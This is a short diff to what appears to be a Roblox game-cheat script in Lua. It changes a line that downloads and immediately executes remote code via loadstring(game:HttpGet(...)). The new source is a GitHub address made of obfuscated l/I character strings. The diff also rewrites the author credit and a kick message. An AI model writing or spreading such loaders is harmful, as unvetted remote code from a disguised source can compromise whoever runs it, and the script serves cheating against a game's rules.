@@ -69,12 +69,11 @@ request({
 
 
 local success, allowed = pcall(function()
-	return  loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/muscle-legend-script/refs/heads/main/main.lua"))()
-tien
+	return loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIlIlIlIlIlIllIlIlIlIlIlIlIlIlIl/lIlIlIlIlIlIlIlIIlIIlIIIIIIIIllllll/refs/heads/main/IlIIIIIIIllIllIlllIIl"))()
 end)
 
 if not success or not allowed then
-	game.Players.LocalPlayer:Kick("not use script lol")
+	game.Players.LocalPlayer:Kick("Dawg, Stop Executing this script, you got no Rizz, Ill rebirth your low Rizz Level")
 	return
 end
 
@@ -188,7 +187,7 @@ local displayName = player.DisplayName
 
 local Window = Library:CreateWindow{
 	Title = displayName .. " Private Script",
-	SubTitle = "By Azen7010",
+	SubTitle = "By Masterboy123",
 	TabWidth = 125,
 	Size = UDim2.fromOffset(830, 525),
 	Resize = true,
